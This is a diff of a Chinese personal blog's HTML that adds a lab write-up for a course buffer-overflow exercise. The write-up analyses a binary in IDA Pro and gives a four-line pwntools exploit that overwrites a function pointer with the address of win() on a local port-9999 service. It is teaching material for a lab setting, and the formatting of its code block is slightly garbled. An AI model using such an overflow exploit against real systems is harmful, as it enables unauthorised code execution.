@@ -73,7 +73,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="缓冲区溢出,网络攻防实验," />
 
 
 
@@ -89,15 +89,21 @@
 
 
 
-<meta name="description" content="一个没人知道的地方">
-<meta property="og:type" content="website">
-<meta property="og:title" content="博伟的博客">
-<meta property="og:url" content="http://libowei.net/tags/缓冲区溢出/index.html">
+<meta name="description" content="题目说明说明：该题目由100、flag两个文件组成。100为可执行代码，存在缓冲区溢出漏洞。请同学们分析该程序的二进制代码找到漏洞成因，并通过修改程序的执行流程导致任意代码执行漏洞将flag中的FLAG信息输出出来。单机执行：请同学们在自己的机器上运行脚本：./host，9999端口即为程序输入端口。如果编写exploit攻击成功，会出现以下提示：{FLAG:this is a flag}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络攻防实验(1)-缓冲区溢出">
+<meta property="og:url" content="http://libowei.net/网络攻防实验-1-缓冲区溢出.html">
 <meta property="og:site_name" content="博伟的博客">
-<meta property="og:description" content="一个没人知道的地方">
+<meta property="og:description" content="题目说明说明：该题目由100、flag两个文件组成。100为可执行代码，存在缓冲区溢出漏洞。请同学们分析该程序的二进制代码找到漏洞成因，并通过修改程序的执行流程导致任意代码执行漏洞将flag中的FLAG信息输出出来。单机执行：请同学们在自己的机器上运行脚本：./host，9999端口即为程序输入端口。如果编写exploit攻击成功，会出现以下提示：{FLAG:this is a flag}">
+<meta property="og:image" content="http://libowei.net/image/网络攻防实验1-1.png">
+<meta property="og:image" content="http://libowei.net/image/网络攻防实验1-2.png">
+<meta property="og:image" content="http://libowei.net/image/网络攻防实验1-3.png">
+<meta property="og:image" content="http://libowei.net/image/网络攻防实验1-4.png">
+<meta property="og:updated_time" content="2017-03-31T11:32:49.771Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="博伟的博客">
-<meta name="twitter:description" content="一个没人知道的地方">
+<meta name="twitter:title" content="网络攻防实验(1)-缓冲区溢出">
+<meta name="twitter:description" content="题目说明说明：该题目由100、flag两个文件组成。100为可执行代码，存在缓冲区溢出漏洞。请同学们分析该程序的二进制代码找到漏洞成因，并通过修改程序的执行流程导致任意代码执行漏洞将flag中的FLAG信息输出出来。单机执行：请同学们在自己的机器上运行脚本：./host，9999端口即为程序输入端口。如果编写exploit攻击成功，会出现以下提示：{FLAG:this is a flag}">
+<meta name="twitter:image" content="http://libowei.net/image/网络攻防实验1-1.png">
 
 
 
@@ -125,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://libowei.net/tags/缓冲区溢出/"/>
+  <link rel="canonical" href="http://libowei.net/网络攻防实验-1-缓冲区溢出.html"/>
 
 
 
 
 
-  <title> 标签: 缓冲区溢出 | 博伟的博客 </title>
+  <title> 网络攻防实验(1)-缓冲区溢出 | 博伟的博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -184,7 +190,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -302,74 +308,220 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-collapse">
-    <div class="collection-title">
-      <h2 >
-        缓冲区溢出
-        <small>标签</small>
-      </h2>
-    </div>
-
+  <div id="posts" class="posts-expand">
     
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h1 class="post-title">
-        
-            <a class="post-title-link" href="/网络攻防实验-2-缓冲区溢出.html" itemprop="url">
-              
-                <span itemprop="name">网络攻防实验(2)-缓冲区溢出</span>
-              
-            </a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-03-31T17:13:35+08:00"
-              content="2017-03-31" >
-          03-31
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h1 class="post-title">
-        
-            <a class="post-title-link" href="/网络攻防实验-1-缓冲区溢出.html" itemprop="url">
-              
-                <span itemprop="name">网络攻防实验(1)-缓冲区溢出</span>
-              
-            </a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-03-31T12:14:34+08:00"
-              content="2017-03-31" >
-          03-31
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-    
-  </div>
 
   
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://libowei.net/网络攻防实验-1-缓冲区溢出.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Albert Lee">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/image/学士服照片.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="博伟的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                网络攻防实验(1)-缓冲区溢出
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-31T12:14:34+08:00">
+                2017-03-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/网络攻防实验-1-缓冲区溢出.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/网络攻防实验-1-缓冲区溢出.html" class="leancloud_visitors" data-flag-title="网络攻防实验(1)-缓冲区溢出">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h2><p>说明：该题目由100、flag两个文件组成。100为可执行代码，存在缓冲区溢出漏洞。请同学们分析该程序的二进制代码找到漏洞成因，并通过修改程序的执行流程导致任意代码执行漏洞将flag中的FLAG信息输出出来。<br>单机执行：请同学们在自己的机器上运行脚本：./host，9999端口即为程序输入端口。如果编写exploit攻击成功，会出现以下提示：<br>{FLAG:this is a flag}</p>
+<a id="more"></a>
+<h2 id="题目下载"><a href="#题目下载" class="headerlink" title="题目下载"></a>题目下载</h2><p><a href="/file/网络攻防实验1.rar">实验程序下载</a></p>
+<h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><ul>
+<li>IDA pro</li>
+<li>pwntools (python2.7)</li>
+<li>socat</li>
+</ul>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ol>
+<li><p>使用IDA pro打开程序，按F5可查看其反汇编代码。<br><img src="/image/网络攻防实验1-1.png" alt="IDA pro F5"><br>注意到scanf函数可能存在缓冲区溢出漏洞。推断此题的解题思路为：通过scanf函数输入一定长度的字符，覆盖栈中的v5()函数的地址。</p>
+</li>
+<li><p>寻找要执行函数的地址。打开函数视图(view-&gt;subview-&gt;function)，找到win()函数：<br><img src="/image/网络攻防实验1-2.png" alt="win函数"><br>执行这个函数可以读出flag文件中内容。</p>
+</li>
+<li><p>寻找溢出点。在scanf函数后添加断点，调试程序。在程序中输入若干个’0’后，栈信息如下：<br><img src="/image/网络攻防实验1-3.png" alt="栈"><br>输入的’a’的ASCII码为0x30，栈中lose()函数的地址为<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">4. 构造payload为 64字节字符+win()函数地址。本题中，执行host.sh脚本可将程序输入/输出重定向到9999端口,可使用pwntools编写exploit。</div><div class="line">```python</div><div class="line">from pwn import *</div><div class="line">conn=remote(&apos;localhost&apos;,9999)</div><div class="line">conn.send(&apos;a&apos;*64+p32(0x0804861B))</div><div class="line">conn.interactive()</div></pre></td></tr></table></figure></p>
+</li>
+</ol>
+<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p><img src="/image/网络攻防实验1-4.png" alt="实验结果"></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>感谢支持！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/image/wechat_reward.png" alt="Albert Lee WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/image/alipay_reward.jpg" alt="Albert Lee Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/缓冲区溢出/" rel="tag"># 缓冲区溢出</a>
+          
+            <a href="/tags/网络攻防实验/" rel="tag"># 网络攻防实验</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/依法治国的发展及对当代大学生法治素养的探讨.html" rel="next" title="依法治国的发展及对当代大学生法治素养的探讨">
+                <i class="fa fa-chevron-left"></i> 依法治国的发展及对当代大学生法治素养的探讨
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/网络攻防实验-2-缓冲区溢出.html" rel="prev" title="网络攻防实验(2)-缓冲区溢出">
+                网络攻防实验(2)-缓冲区溢出 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -377,6 +529,12 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
 
         </div>
         
@@ -396,8 +554,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/image/学士服照片.jpg"
@@ -501,6 +668,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目说明"><span class="nav-number">1.</span> <span class="nav-text">题目说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目下载"><span class="nav-number">2.</span> <span class="nav-text">题目下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用工具"><span class="nav-number">3.</span> <span class="nav-text">使用工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题步骤"><span class="nav-number">4.</span> <span class="nav-text">解题步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验结果"><span class="nav-number">5.</span> <span class="nav-text">实验结果</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -640,6 +823,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
